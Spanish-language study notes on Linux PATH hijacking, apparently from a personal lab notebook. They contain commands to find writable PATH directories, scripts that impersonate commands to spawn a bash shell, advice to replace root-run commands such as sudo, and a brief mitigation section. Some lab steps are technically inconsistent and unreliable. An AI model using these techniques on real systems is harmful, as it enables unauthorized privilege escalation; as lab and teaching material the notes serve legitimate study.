
-------

### 1. **Entender el PATH Hijacking**

El PATH Hijacking ocurre cuando un usuario malicioso reemplaza un comando legítimo con un script o un binario malicioso que se ejecutará en lugar del comando original. Esto puede suceder si el sistema busca un ejecutable en un directorio que el atacante controla, antes de buscar en los directorios estándar.

### 2. **Detección de Oportunidades para PATH Hijacking**

- **Verificar el PATH Actual**:

    `echo $PATH`
    
- **Identificar Directorios con Permisos de Escritura**: Revisa cada directorio listado en `PATH` para identificar si hay alguno donde tengas permisos de escritura.
    

    
    `for dir in $(echo $PATH | tr ':' ' '); do     if [ -w "$dir" ]; then         echo "$dir es escribible"     fi done`
    

### 3. **Explotación de PATH Hijacking**

- **Crear un Script Malicioso**: Si encuentras un directorio escribible en tu `PATH`, crea un script que tenga el mismo nombre que el comando que deseas reemplazar.
    
    
    `echo -e '#!/bin/bash\n/bin/bash -i' > /ruta/a/tu/directory/command_name chmod +x /ruta/a/tu/directory/command_name`
    
- **Ejecutar el Comando**: Cuando el usuario o un servicio ejecute el comando original, se ejecutará tu script malicioso en su lugar.

### 4. **Escalar Privilegios**

- **Identificar Comandos con Privilegios Elevados**: Busca comandos que puedan ejecutarse con privilegios de root o que sean usados en scripts de inicio o cron.
- **Inyectar Comandos Maliciosos**: Reemplaza comandos como `sudo`, `service`, o cualquier script que se ejecute con permisos de root.

### 5. **Verificación de la Explotación**

- **Probar la Ejecución**: Ejecuta el comando que has reemplazado para confirmar que tu script se ejecuta en su lugar:
    
    `command_name`
    
- **Obtener Acceso Elevado**: Si has reemplazado un comando que permite escalación, puedes obtener acceso a una shell de root.

### 6. **Mitigación**

- **Revisar y Limitar el PATH**: Asegúrate de que el `PATH` no incluya directorios inseguros o escribibles.
- **Usar Rutas Absolutas**: Es recomendable usar rutas absolutas en scripts y comandos críticos para evitar problemas de PATH Hijacking.
- **Auditar Directorios de Ejecutables**: Monitorea y audita regularmente los directorios donde se encuentran los ejecutables para detectar cambios no autorizados.
------

![[Pasted image 20241026195348.png]]

Vamos a hacer un script en C de la siguiente forma para poner a prueba el laboratorio.

![[Pasted image 20241026195633.png]]

se compila y se guarda como 

![[Pasted image 20241026195648.png]]

Y posteriormente, se le dan permisos de ejecución.

Ya con el usuario no privilegiado, podemos hacer lo siguiente:

Añadirle a nuestro `PATH` de búsqueda el directorio `/tmp`:



`export PATH=$PATH:/tmp`

Esto permitirá que cualquier ejecutable colocado en `/tmp` se ejecute antes que otros comandos en el sistema.

![[Pasted image 20241026201414.png]]

Y creo un binario `whoami` en `/tmp` para hacer que el código ejecutado en el test me apunte a este binario como prioridad en la ruta `/tmp`, y de esta forma, el script `whoami.sh` me ejecute cualquier tipo de comando que yo quiera de la siguiente manera:

1. **Crear el Script `whoami.sh`**: Primero, creo un script llamado `whoami.sh` en el directorio `/tmp`:

    
    `echo -e '#!/bin/bash\nexec /bin/bash' > /tmp/whoami.sh chmod +x /tmp/whoami.sh`
    
2. **Crear el Binario `whoami`**: Luego, creo un binario `whoami` que redirige a `whoami.sh`:
    
    
    `cp /bin/true /tmp/whoami chmod +x /tmp/whoami`
    
3. **Probar el Comando**: Al ejecutar el comando `whoami`, se ejecutará el binario en `/tmp` debido a que hemos añadido `/tmp` al `PATH`, lo que permitirá que el script ejecute cualquier comando con privilegios:
    
    
    `whoami`
    

Esto hará que se ejecute el script `whoami.sh` que, a su vez, proporcionará acceso a una shell de `bash`, permitiendo ejecutar cualquier comando que se desee con los privilegios del usuario actual.

![[Pasted image 20241026201652.png]]


Entonces, esto sería lo que pasaría al ejecutar el binario de **test**:

![[Pasted image 20241026201806.png]]


